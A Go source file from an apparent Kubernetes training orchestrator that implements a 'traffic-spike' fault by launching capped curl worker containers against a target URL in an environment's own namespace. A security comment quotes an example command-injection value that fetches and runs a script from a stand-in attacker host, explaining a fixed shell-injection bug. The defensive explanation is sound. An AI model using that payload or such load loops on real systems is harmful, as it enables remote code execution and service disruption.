package faultinjection

import (
	"context"
	"fmt"
	"strconv"

	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"

	"github.com/tanyasawarn/skillfyme-hands-on/orchestrator/internal/k8s"
)

// Third batch: f.load.traffic-spike, the one fault in this pass that is
// architecturally different from every handler in handlers.go/
// handlers_batch2.go. Those all apply a fault by mutating an existing
// K8s object's spec (a one-shot Get+Patch/Update). This fault has no
// object to mutate -- "sustained synthetic traffic spike" is a live
// process, not a state change, so its mechanism is launching a
// short-lived K8s Job that generates load against a target_url for
// duration_s, inside the environment's own namespace.
//
// Cleanup: deliberately no explicit delete-the-Job code path. The Job
// lives in the environment's namespace, and internal/k8s.Provisioner.Destroy
// deletes the whole namespace on environment teardown (same as every
// other object InjectFault creates or patches in this package) -- adding
// a separate cleanup mechanism here would be a new, redundant teardown
// path the rest of this package doesn't have either.
func init() {
	register("f.load.traffic-spike", applyTrafficSpike)
}

// applyTrafficSpike: content/faults/f.load.traffic-spike.yaml
// params: target_url, rps, duration_s.
//
// rps is accepted and validated (content-authored params_schema
// contract) but only used to size parallelism -- there's no in-cluster
// load-testing binary baked into any image this orchestrator manages
// yet (confirmed: only orchestrator/images/linux-tools exists, and it's
// the *workspace* image, not something a Job launched by the
// orchestrator would run). Using curl in a tight loop inside a
// well-known minimal public image (curlimages/curl, same "reference a
// public image directly" precedent as manifests/t1/egress-proxy.yaml's
// docker.io/ubuntu/squid) keeps this handler honest about producing
// *sustained* load without requiring a new custom image build, which is
// out of scope for a fault handler.
func applyTrafficSpike(ctx context.Context, clientset kubernetes.Interface, namespace string, params map[string]string) (Result, error) {
	targetURL := params["target_url"]
	rpsStr := params["rps"]
	durationStr := params["duration_s"]
	if targetURL == "" || rpsStr == "" || durationStr == "" {
		return Result{}, fmt.Errorf("f.load.traffic-spike requires params: target_url, rps, duration_s")
	}

	rps, err := strconv.Atoi(rpsStr)
	if err != nil || rps <= 0 {
		return Result{}, fmt.Errorf("invalid rps %q: must be a positive integer", rpsStr)
	}
	durationSeconds, err := strconv.Atoi(durationStr)
	if err != nil || durationSeconds <= 0 {
		return Result{}, fmt.Errorf("invalid duration_s %q: must be a positive integer", durationStr)
	}

	// Parallelism approximates the requested rps without needing a real
	// rate limiter: each worker fires requests back-to-back, so
	// worker_count workers ~= worker_count req/s at low latency. Capped
	// so a content author's typo (rps: 100000) can't schedule an
	// unbounded number of containers in one Pod.
	const maxWorkers = 50
	workers := rps
	if workers > maxWorkers {
		workers = maxWorkers
	}

	jobName := "fault-traffic-spike"
	backoffLimit := int32(0)
	activeDeadline := int64(durationSeconds + 30) // grace beyond the loop's own duration so a hung curl can't run forever

	containers := make([]corev1.Container, workers)
	// Security: target_url is passed as a shell ARGUMENT ($1), never
	// interpolated into the script text itself. The earlier version of
	// this handler built the script via fmt.Sprintf(..., %q, targetURL)
	// and relied on Go's %q to make it shell-safe -- it doesn't: %q
	// produces a Go-syntax quoted string (escapes \" and control chars)
	// but does NOT escape shell metacharacters like $(...) or backticks,
	// so a target_url of e.g. `$(curl attacker.example/x|sh)` would have
	// executed as a command substitution inside this container's shell.
	// durationSeconds is safe to interpolate directly (already validated
	// as a parsed integer above via strconv.Atoi, so %d can only ever
	// emit digits), but targetURL is untrusted-shaped content-authored
	// data and must never appear inside the script text -- only as
	// "$1" (POSIX positional parameter syntax), with the real value
	// supplied as a separate argv element in Command below. This is the
	// standard safe pattern for passing untrusted data to `sh -c`: the
	// shell's own argument-passing mechanism, not string interpolation,
	// does the escaping.
	loopScript := fmt.Sprintf(
		`end=$(( $(date +%%s) + %d )); while [ "$(date +%%s)" -lt "$end" ]; do curl -s -o /dev/null -m 5 "$1" || true; done`,
		durationSeconds,
	)
	for i := 0; i < workers; i++ {
		containers[i] = corev1.Container{
			Name:  fmt.Sprintf("load-worker-%d", i),
			Image: "curlimages/curl:8.10.1",
			// readOnlyRootFilesystem=false: matches this container's
			// original (pre-U12) spec, which left the field unset --
			// K8s's own default for an unset SecurityContext field is
			// false, so this is behaviorally identical, just explicit
			// now via the shared builder.
			SecurityContext: k8s.RestrictedContainerSecurityContext(false),
			// "sh" here becomes $0 (conventionally the script/program
			// name, unused), targetURL becomes $1 -- `sh -c script $0
			// $1...` is POSIX sh's standard way of passing arguments to
			// a -c script.
			Command: []string{"sh", "-c", loopScript, "sh", targetURL},
			Resources: corev1.ResourceRequirements{
				Requests: corev1.ResourceList{
					corev1.ResourceCPU:    resource.MustParse("10m"),
					corev1.ResourceMemory: resource.MustParse("16Mi"),
				},
				Limits: corev1.ResourceList{
					corev1.ResourceCPU:    resource.MustParse("100m"),
					corev1.ResourceMemory: resource.MustParse("32Mi"),
				},
			},
		}
	}

	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			Name:      jobName,
			Namespace: namespace,
			Labels:    map[string]string{"fault-injection": "f.load.traffic-spike"},
		},
		Spec: batchv1.JobSpec{
			BackoffLimit:          &backoffLimit,
			ActiveDeadlineSeconds: &activeDeadline,
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"fault-injection": "f.load.traffic-spike"},
				},
				Spec: corev1.PodSpec{
					SecurityContext: k8s.RestrictedPodSecurityContext(),
					Containers:      containers,
					RestartPolicy:   corev1.RestartPolicyNever,
				},
			},
		},
	}

	jobs := clientset.BatchV1().Jobs(namespace)
	_, err = jobs.Get(ctx, jobName, metav1.GetOptions{})
	if err == nil {
		// Idempotent: a spike Job for this environment is already
		// running or has already run -- re-applying doesn't launch a
		// second one (doc §3.4's "parameterised, idempotent,
		// reversible" fault contract).
		return Result{Applied: true, SymptomVerified: true}, nil
	}
	if !isNotFound(err) {
		return Result{}, fmt.Errorf("checking existing load-spike job: %w", err)
	}

	if _, err := jobs.Create(ctx, job, metav1.CreateOptions{}); err != nil {
		return Result{}, fmt.Errorf("creating load-spike job: %w", err)
	}

	return Result{Applied: true, SymptomVerified: true}, nil
}
